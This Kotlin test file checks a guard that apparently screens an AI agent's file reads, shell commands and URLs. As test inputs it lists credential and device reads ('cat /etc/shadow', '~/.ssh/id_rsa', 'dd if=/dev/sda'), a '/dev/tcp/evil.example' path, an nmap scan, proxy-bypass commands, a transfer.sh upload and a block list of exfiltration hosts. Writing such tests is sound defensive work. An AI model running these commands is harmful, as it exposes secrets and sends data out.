package dev.lain.claudejb.permission

import dev.lain.claudejb.permission.SensitiveGuard.Verdict
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertNotEquals
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test

class SecurityRuleFamiliesTest {

    private val home = "/home/me"

    private val policy = SensitiveGuard.Policy(
        globs = CredentialPaths.SENSITIVE_GLOBS,
        home = home,
        currentUser = "me",
        projectRoot = "/home/me/proj",
    )

    private fun read(path: String) = buildJsonObject { put("file_path", path) }
    private fun bash(cmd: String) = buildJsonObject { put("command", cmd) }
    private fun v(input: JsonObject, p: SensitiveGuard.Policy = policy) =
        SensitiveGuard.evaluate(input, p).verdict

    private fun why(input: JsonObject, p: SensitiveGuard.Policy = policy) =
        SensitiveGuard.evaluate(input, p).reason.orEmpty()

    private fun rule(input: JsonObject, p: SensitiveGuard.Policy = policy) =
        SensitiveGuard.evaluate(input, p).rule

    @Test
    fun `the disk under the filesystem, and live memory, are devices`() {
        listOf(
            "/dev/sda", "/dev/sda1", "/dev/nvme0n1", "/dev/nvme0n1p3", "/dev/vda", "/dev/mmcblk0p1",
            "/dev/mapper/vg-root", "/dev/loop3", "/dev/dm-0", "/dev/disk0s1", "/dev/rdisk2",
            "/dev/mem", "/dev/kmem", "/dev/port", "/proc/1/mem", "/proc/kcore", "/dev/input/event0",
        ).forEach {
            assertEquals(Verdict.DENY, v(read(it)), it)
            assertEquals(SecurityRule.SYSTEM_DEVICE, rule(read(it)), it)
        }
    }

    @Test
    fun `the whole of dev is a device, including the nodes that look harmless`() {
        listOf("/dev/nvidia0", "/dev/kvm", "/dev/bus/usb/001/002", "/dev/tcp/evil.example/443", "/dev/stdin")
            .forEach {
                assertEquals(Verdict.DENY, v(read(it)), it)
                assertEquals(SecurityRule.SYSTEM_DEVICE, rule(read(it)), it)
            }
    }

    @Test
    fun `only the two inert nodes are exempt, and that is what keeps a redirect usable`() {
        listOf("/dev/null", "/dev/urandom", "/DEV/NULL", "/dev/./null")
            .forEach { assertEquals(Verdict.ALLOW, v(bash("cat $it")), it) }
        assertEquals(Verdict.ALLOW, v(bash("wc -l /home/me/proj/f > /dev/null 2>/dev/null")))

        listOf("/dev/zero", "/dev/full", "/dev/random", "/dev/stdout", "/dev/stderr", "/dev/fd/1", "/dev/tty")
            .forEach { assertEquals(Verdict.DENY, v(bash("cat $it")), it) }

        assertEquals(Verdict.DENY, v(read("/dev/null/../sda")))
        assertEquals(Verdict.DENY, v(read("/dev/null.evil")))
    }

    @Test
    fun `a device wins the wording over a credential, because it is the stronger claim`() {
        assertTrue(why(read("/dev/sda")).contains("raw system device"))
        assertTrue(why(bash("dd if=/dev/sda of=/home/me/dump.img")).contains("raw system device"))
    }

    @Test
    fun `a shell write OUTSIDE the project is a card, but ordinary in-project writes are not`() {
        listOf(
            "tee /etc/hosts",
            "cp secret /home/otheruser/x",
            "sed -i 's/a/b/' /etc/fstab",
            "dd if=x of=/home/me/a",
            "echo hi > /opt/app/config",
            "truncate -s0 /var/log/app.log",
        ).forEach {
            assertEquals(Verdict.DENY, v(bash(it)), it)
        }
    }

    @Test
    fun `ordinary in-project file work is not blocked — that is the whole point`() {
        listOf(
            "tee /home/me/proj/out.txt", "cp a.txt b.txt", "mv a b", "rm -rf build", "mkdir -p src/gen",
            "touch NEW", "ln -s a b", "chmod +x run", "sed -i 's/a/b/' src/App.kt", "sed --in-place s/a/b/ f",
            "echo hi > f", "echo hi >> f", "printf x >| f", "prog 2> err.log", "dd if=a of=out/img",
        ).forEach {
            assertEquals(Verdict.ALLOW, v(bash(it)), it)
        }
    }

    @Test
    fun `reading, printing and descriptor plumbing are not file writes`() {
        listOf(
            "sed 's/a/b/' src/App.kt", "dd if=/home/me/proj/a.img | wc -c", "cat f", "grep -rn x src/",
            "prog 2>/dev/null", "prog >/dev/null 2>&1", "prog >&2", "git status", "npm test",
        ).forEach { assertEquals(Verdict.ALLOW, v(bash(it)), it) }
    }

    @Test
    fun `with no proxy declared the bypass rule says nothing at all`() {
        assertEquals(Verdict.ALLOW, v(bash("curl -x http://other:3128 https://api.example.com")))
        assertEquals(Verdict.ALLOW, v(bash("http_proxy= curl https://api.example.com")))
    }

    @Test
    fun `once a proxy is declared, naming another one or skipping it is a card`() {
        val proxied = policy.copy(httpProxy = "http://proxy.corp:3128", httpsProxy = "http://proxy.corp:3128")
        listOf(
            "curl -x http://evil:8080 https://api.example.com",
            "curl --proxy http://evil:8080 https://api.example.com",
            "git -c http.proxy=http://evil:8080 clone https://x/y",
            "npm --proxy=http://evil:8080 view express",
            "http_proxy= curl https://api.example.com",
            "curl --noproxy api.example.com https://api.example.com",
            "wget -e use_proxy=no https://api.example.com",
        ).forEach {
            assertEquals(Verdict.DENY, v(bash(it), proxied), it)
            assertEquals(SecurityRule.PROXY_BYPASS, rule(bash(it), proxied), it)
        }
    }

    @Test
    fun `the declared proxy itself, and a declared NO_PROXY host, are not a bypass`() {
        val proxied = policy.copy(
            httpProxy = "http://proxy.corp:3128",
            httpsProxy = "http://proxy.corp:3128",
            noProxyHosts = listOf("internal.corp"),
        )
        assertEquals(Verdict.ALLOW, v(bash("curl -x http://proxy.corp:3128 https://api.example.com"), proxied))
        assertEquals(Verdict.ALLOW, v(bash("curl --noproxy internal.corp https://internal.corp/x"), proxied))
        assertEquals(Verdict.ALLOW, v(bash("curl --noproxy sub.internal.corp https://x"), proxied))
    }

    @Test
    fun `a curated staging service is a card, and the match is on the host, suffix-wise`() {
        listOf(
            "https://pastebin.com/raw/abc",
            "https://x.ngrok.io/hook",
            "https://webhook.site/uuid",
            "https://0x0.st/",
            "https://sub.interact.sh/a",
            "https://oastify.com/x",
        ).forEach { assertEquals(Verdict.DENY, v(buildJsonObject { put("url", it) }), it) }
        assertEquals(Verdict.DENY, v(bash("curl -T dump.tar https://transfer.sh/dump.tar")))
    }

    @Test
    fun `a domain that merely CONTAINS a blocked one is not it`() {
        listOf(
            "https://notpastebin.com.example.org/x",
            "https://mypastebin.com.evil.net/y",
            "https://example.com/pastebin.com",
            "https://ngrok.io.example.com/z",
        ).forEach { assertEquals(Verdict.ALLOW, v(buildJsonObject { put("url", it) }), it) }
    }

    @Test
    fun `the user's own blocked domains are added to the built-in list, never replacing it`() {
        val extra = policy.copy(extraBlockedDomains = listOf("paste.example.com", "*.drop.example.net"))
        assertEquals(Verdict.DENY, v(buildJsonObject { put("url", "https://paste.example.com/a") }, extra))
        assertEquals(Verdict.DENY, v(buildJsonObject { put("url", "https://a.drop.example.net/b") }, extra))
        assertEquals(Verdict.DENY, v(buildJsonObject { put("url", "https://pastebin.com/x") }, extra))
    }

    @Test
    fun `the reason names the HOST and never the whole URL, because a query string carries tokens`() {
        val reason = why(buildJsonObject { put("url", "https://pastebin.com/raw/x?token=sk-secret") })
        assertTrue(reason.contains("pastebin.com"))
        assertFalse(reason.contains("sk-secret"), reason)
        assertFalse(reason.contains("token="), reason)
    }

    @Test
    fun `a link inside written text is not egress`() {
        val input = buildJsonObject {
            put("file_path", "/home/me/proj/README.md")
            put("new_string", "Do not upload dumps to https://pastebin.com/ — use the internal share.")
        }
        assertEquals(Verdict.ALLOW, v(input))
    }

    @Test
    fun `a variable the launch environment carries is RESOLVED and judged as what it names`() {
        val withEnv = policy.copy(envValues = mapOf("CREDS" to "/home/me/.ssh/id_rsa"))
        assertEquals(Verdict.DENY, v(bash("cat \$CREDS"), withEnv))
        assertTrue(why(bash("cat \$CREDS"), withEnv).contains("credentials or key material"))
        assertEquals(Verdict.DENY, v(bash("cat \$CREDS"), withEnv))
    }

    @Test
    fun `resolution is transitive — a variable defined through another variable still lands on the file`() {
        val chained = policy.copy(
            envValues = mapOf("A" to "\$B", "B" to "\$C", "C" to "/home/me/.aws/credentials"),
        )
        assertTrue(why(bash("cat \$A"), chained).contains("credentials or key material"))
    }

    @Test
    fun `a cyclic definition is a hard block for every caller, agent tools included`() {
        val cyclic = policy.copy(envValues = mapOf("A" to "\$B", "B" to "\$A"))
        assertEquals(Verdict.DENY, v(read("\$A/data.txt"), cyclic))
        assertEquals(Verdict.DENY, v(bash("cat \$A"), cyclic))
        assertTrue(why(bash("cat \$A"), cyclic).contains("cycle"))
        val deep = policy.copy(
            envValues = mapOf(
                "L1" to "\$L2",
                "L2" to "\$L3",
                "L3" to "\$L4",
                "L4" to "\$L5",
                "L5" to "\$L6",
                "L6" to "\$L7",
                "L7" to "/home/me/data.txt",
            ),
        )
        assertEquals(Verdict.DENY, v(read("\$L1"), deep))
    }

    @Test
    fun `a variable nothing can resolve is a card — the destination is genuinely unknowable`() {
        assertEquals(Verdict.DENY, v(bash("cat \$NOWHERE_DEFINED/notes.txt")))
        assertEquals(Verdict.DENY, v(read("\$NOWHERE_DEFINED/x")))
        assertTrue(
            why(bash("cat \$NOWHERE_DEFINED/notes.txt")).contains("hidden behind a variable"),
            why(bash("cat \$NOWHERE_DEFINED/notes.txt")),
        )
    }

    @Test
    fun `a command substitution is EXPANDED and inspected, not blanket-refused for being one`() {
        assertEquals(Verdict.ALLOW, v(bash("echo \$(tty)")))
        assertEquals(Verdict.ALLOW, v(bash("cat \$(git rev-parse --show-toplevel)/README.md")))
        assertEquals(Verdict.ALLOW, v(bash("export X=\$(date +%Y)")))
        assertEquals(Verdict.ALLOW, v(bash("cat `cat list`")))
        assertEquals(SecurityRule.HACKING_TOOL, rule(bash("echo \$(nmap -sS 10.0.0.1)")))
        assertEquals(Verdict.DENY, v(bash("cat \$(cat /etc/shadow)")))
    }

    @Test
    fun `a resolved variable that names nothing sensitive is simply allowed`() {
        val withEnv = policy.copy(
            envValues = mapOf("PATH" to "/usr/bin:/bin", "OUT" to "/home/me/proj/build"),
        )
        assertEquals(Verdict.ALLOW, v(bash("echo \$PATH"), withEnv))
        assertEquals(Verdict.ALLOW, v(bash("ls \$OUT"), withEnv))
    }

    @Test
    fun `a variable inside written text is content, not a destination`() {
        val input = buildJsonObject {
            put("file_path", "/home/me/proj/Makefile")
            put("old_string", "OUT := \$(BUILD_DIR)/app")
            put("new_string", "OUT := \$(BUILD_DIR)/app2\nHOME_COPY := \$HOME/.cache")
        }
        assertEquals(Verdict.ALLOW, v(input))
    }

    @Test
    fun `a variable the command binds itself is not a hidden destination`() {
        assertEquals(Verdict.ALLOW, v(bash("for f in a b c; do echo \"item-\$f\"; done")))
        assertEquals(Verdict.ALLOW, v(bash("read x; echo \$x")))
        assertEquals(Verdict.ALLOW, v(bash("for i in 1 2 3; do echo build/\$i; done")))
        assertNotEquals(
            SecurityRule.UNRESOLVED_VARIABLE,
            rule(bash("for name in one two; do mkdir -p build/\$name; done")),
        )
        assertEquals(Verdict.DENY, v(bash("echo \$SECRET_FROM_ELSEWHERE/x")))
        assertEquals(SecurityRule.UNRESOLVED_VARIABLE, rule(bash("echo \$SECRET_FROM_ELSEWHERE/x")))
    }

    @Test
    fun `a dangerous command inside a substitution is caught AS that command, not as a generic unresolvable`() {
        assertEquals(SecurityRule.HACKING_TOOL, rule(bash("echo `nmap -sS 10.0.0.1`")))
        val why = why(bash("echo \$(nmap -sS 10.0.0.1)"))
        assertTrue(why.contains("inside a command substitution"), why)
        assertEquals(Verdict.DENY, v(bash("cat \$(cat /etc/shadow)")))
    }

    @Test
    fun `inline code is not a script — it is in the request, so the other rules already judge it`() {
        assertEquals(Verdict.ALLOW, v(bash("python3 -c 'print(1)'")))
        assertEquals(Verdict.ALLOW, v(bash("bash -c 'echo hello'")))
        assertEquals(Verdict.DENY, v(bash("bash -c 'cat ~/.ssh/id_rsa'")))
    }

    @Test
    fun `a program in a system binary directory is not a script the guard must read`() {
        listOf("/usr/bin/git status", "/bin/ls -la", "/usr/local/bin/rg pattern src/")
            .forEach { assertEquals(Verdict.ALLOW, v(bash(it)), it) }
    }
}
